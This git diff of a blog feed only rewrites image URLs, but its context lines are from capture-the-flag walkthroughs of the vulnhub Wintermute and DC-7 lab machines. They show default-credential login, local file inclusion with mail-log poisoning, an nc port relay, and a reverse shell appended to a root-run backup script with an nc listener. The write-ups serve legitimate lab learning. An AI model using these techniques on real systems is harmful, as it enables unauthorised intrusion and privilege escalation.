@@ -99,25 +99,25 @@ WINTERMUTE
 
 &lt;p&gt;Chilling! I did a little more enumeration on the page, using dirbuster, and checking the page source, but didn&amp;rsquo;t find anything out of the ordinary.  Then we check the Hadoop server on port 3000:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/ntopng-login.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/ntopng-login.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Looks like the login page for &lt;a href=&#34;https://www.ntop.org/products/traffic-analysis/ntop/&#34;&gt;ntopng&lt;/a&gt;, which seems to be a web frontend for ntop.  A quick Google search turns up admin/admin as the default credentials (in fact, it even shows them on the login page!), and the Straylight sysadmin never changed them.&lt;/p&gt;
 
 &lt;p&gt;As we look through the web interface, we can suss out the IP of Neuromancer, by looking at the detected hosts:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/ntopng-hosts.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/ntopng-hosts.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;It took me a while to find anything useful here.  Eventually I found that if you look at the Loopback adapter (under Interfaces &amp;gt; lo) and check the flow, you can see a couple of other directories on port 80:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/ntopng-flows.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/ntopng-flows.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Freeside was pretty boring, looked like just a landing page.  Nothing in the source, no hidden subdirectories (that I could find).  Turing-bolo was a lot more interesting though.  Looks like the Straylight team is on to us!&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/turing-bolo.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/turing-bolo.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;The dropdown on the main page, changes the bolo= parameter in the url.  Also Case&amp;rsquo;s bolo entry mentions that the operator added other files ending in .log for the other team members.  I started checking for LFI, manually and using wfuzz, but wasn&amp;rsquo;t able to find anything.  I ended up having to look at a &lt;a href=&#34;https://mzfr.github.io/vulnhub-writeups/2019-07-26-wintermute&#34;&gt;walkthrough&lt;/a&gt; for a hint.  I was on the right track, but nothing I had tried was quite correct.  bolo=/var/log/mail did the trick:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/mail-log.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/mail-log.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Now that we can print a log on the page, we might be able to connect to the smtp server, and include a php script on the page.  I connected to the server with telnet, and sent some junk mail to a user that probably existed (root@straylight), and checked the web page to see what was being logged.  The body of the message wasn&amp;rsquo;t included, but the subject line is!&lt;/p&gt;
 
@@ -339,7 +339,7 @@ nc -l -p 34483 -c &amp;quot;nc 10.0.2.5 34483&amp;quot; &amp;amp;
 
 &lt;p&gt;And now from our attacking box, we can see what&amp;rsquo;s listening.  Port 8080 is Apache Tomcat:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/wintermute/tomcat.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/wintermute/tomcat.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Port 8009 wasn&amp;rsquo;t loading for me in my browser, and I wasn&amp;rsquo;t able to see anything with banner grabbing, so I left it for now.&lt;/p&gt;
 
@@ -505,15 +505,15 @@ Nmap done: 1 IP address (1 host up) scanned in 12.75 seconds
 
 &lt;p&gt;Port 80 is running a Drupal server.  Doing some quick manual enumeration doesn&amp;rsquo;t turn up anything exciting, except for a possible username in the footer:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/dc7/drupal.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/dc7/drupal.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Doesn&amp;rsquo;t work as a username on the site (as far as we can tell so far), but it looks like a twitter handle.  Sure enough:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/dc7/twitter.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/dc7/twitter.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Again, no interesting tweets, but there&amp;rsquo;s a link to a github profile.  Going through the code, we find a username and password in the config.php file:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/dc7/github.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/dc7/github.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;That username and password doesn&amp;rsquo;t work on the Drupal site, but it does work for SSH.  Just like that, we&amp;rsquo;ve got a user shell.&lt;/p&gt;
 
@@ -616,7 +616,7 @@ Changed password for admin
 
 &lt;p&gt;Now that we have a Drupal admin account, we need to use it to get a shell.  Remember that script that was running as root?  I&amp;rsquo;m not super proud of my solution, but I found a plugin for Drupal called &lt;a href=&#34;https://www.drupal.org/project/shell&#34;&gt;shell&lt;/a&gt;, which does exactly what you think it does.  From there, it was a pretty simple matter of appending a reverse shell to the backup script that we found that runs as root:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/dc7/webshell.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.brigzzy.ca/images/dc7/webshell.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;Listener:
 nc -lvp 4444
